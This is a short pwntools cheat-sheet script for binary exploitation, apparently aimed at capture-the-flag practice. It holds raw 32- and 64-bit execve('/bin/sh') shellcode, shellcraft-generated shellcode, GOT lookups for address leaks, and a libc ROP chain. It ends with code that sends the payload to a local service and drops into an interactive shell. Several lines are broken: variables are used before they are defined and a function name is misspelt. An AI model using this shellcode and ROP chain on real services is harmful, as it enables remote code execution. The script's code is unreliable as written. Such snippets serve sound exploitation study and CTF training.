# Pwntools Code Snippet

# 0. Import
from pwn import *
import re

DEBUG = 1

# 1. Making Exploitation
# 1.1 case of using crafted shellcode
exploit = p64(1)
exploit32 += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shell64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

# 1.2 case of making shellcode using asm()
exploit = asm(shellcraft.i386.pushstr('/bin///sh'))
exploit += asm(shellcraft.i386.mov('ebx','esp'))

# 1.3 case of using GOT Overwrite
elf = ELF('binary')
libc = ELF('libc.so.6')
#   find GOT address to leak information
exploit2 = hex(elf.symbols['write'])
exploit2 += hex(elf.got['printf'])

# 1.4 case of making ROP Chain
dump = open('libc.so.6').read()

addr_ret = 0x80484d2
offset_binsh = dump.index('/bin/sh\x00')
offset_pop_eax = dump.index('\x58\xc3')
offset_pop_ebx = dump.index('\x5b\xc3')
offset_pop_ecx_edx = dump.index('\x59\x5a\xc3')
offset_int80 = dump.index('\xcd\x80')

exploit3 = p32(addr_libc + offset_pop_eax) + p32(11)
exploit3 += p32(addr_libc + offset_pop_ebx) + p32(addr_libc + offset_binsh)
exploit3 += p32(addr_ret)
exploit3 += p32(addr_libc + offset_pop_ecx_edx) + p32(0) + p32(0)
exploit3 += p32(addr_libc + offset_int80)

# 2. Communicate to exploitable
if DEBUG == 1:
    r = remote('127.0.0.1' ,1338)
#    r = presess("./xxxxxx")
else:
    r = remote('127.0.0.1' ,1338)


# for gdb debug
raw_input()

# output log to stdout
log.info('[+]leak stack_addr')

# read until specific word (recv(), recvline(), recvlines(), recvall())
line = r.recvuntil('password? ')

# extract output
result = re.search(r'result: ([^,]*), code: (.*)', data)
base_addr = result.group(1)
libc_addr = u32(result.group(2)[:4])

# send data (sendline())
r.send(exploit+'\n')
# change interactive mode
r.interactive()
